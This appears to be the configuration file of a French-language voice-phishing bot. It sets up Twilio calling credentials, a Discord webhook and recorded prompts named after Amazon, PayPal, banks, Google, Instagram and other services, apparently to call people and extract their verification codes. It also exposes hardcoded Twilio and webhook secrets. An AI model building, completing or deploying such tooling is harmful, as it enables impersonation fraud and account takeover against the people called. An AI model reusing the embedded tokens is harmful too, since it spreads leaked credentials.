module.exports = {
    setupdone: 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'AC447150c3689b4b05d605db8473765f36',
    authToken: '4e8594fe6a6f40a676863cc2593c82d5',
    callerid: '+12185432562',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'passwordtochange',
    serverurl: 'http://yourserverip:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/1321026560278396971/fnJyISyrQRJL_vh3ANqRcfWNK7_RHviyXnN4LlHiNbjviXnkt1SpUJlaj-m7IH6bUUPq',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
